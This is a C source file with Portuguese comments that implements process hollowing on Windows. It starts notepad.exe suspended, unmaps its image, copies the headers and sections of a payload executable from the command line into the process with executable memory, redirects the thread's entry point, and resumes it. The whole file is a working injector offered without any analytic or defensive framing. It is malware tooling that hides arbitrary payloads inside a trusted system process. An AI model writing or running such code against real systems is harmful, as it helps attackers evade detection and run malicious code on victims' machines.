#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Uso: %s <caminho_para_payload.exe>\n", argv[0]);
        return -1;
    }

    const char* targetPath = "C:\\Windows\\System32\\notepad.exe";
    const char* payloadPath = argv[1];

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    // Lê payload
    HANDLE hPayload = CreateFileA(payloadPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    DWORD payloadSize = GetFileSize(hPayload, NULL);
    BYTE* payloadBuffer = HeapAlloc(GetProcessHeap(), 0, payloadSize);
    DWORD bytesRead;
    ReadFile(hPayload, payloadBuffer, payloadSize, &bytesRead, NULL);
    CloseHandle(hPayload);

    // Headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payloadBuffer + dosHeader->e_lfanew);
    LPVOID imageBase = (LPVOID)ntHeaders->OptionalHeader.ImageBase;

    // Cria processo suspenso
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("Erro CreateProcess: %lu\n", GetLastError());
        return -1;
    }

    // Unmap original image
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    NtUnmapViewOfSection(pi.hProcess, imageBase);

    // Aloca imagem remota
    LPVOID remoteImage = VirtualAllocEx(pi.hProcess, imageBase, ntHeaders->OptionalHeader.SizeOfImage,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copia headers
    WriteProcessMemory(pi.hProcess, remoteImage, payloadBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // Copia seções
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID localAddr = payloadBuffer + section[i].PointerToRawData;
        LPVOID remoteAddr = (LPVOID)((LPBYTE)remoteImage + section[i].VirtualAddress);
        WriteProcessMemory(pi.hProcess, remoteAddr, localAddr, section[i].SizeOfRawData, NULL);
    }

    // Pega contexto da thread
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (ULONGLONG)((LPBYTE)remoteImage + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &ctx);

    // Resume
    ResumeThread(pi.hThread);

    printf("[+] Hollowing concluído. PID: %lu\n", pi.dwProcessId);
    return 0;
}
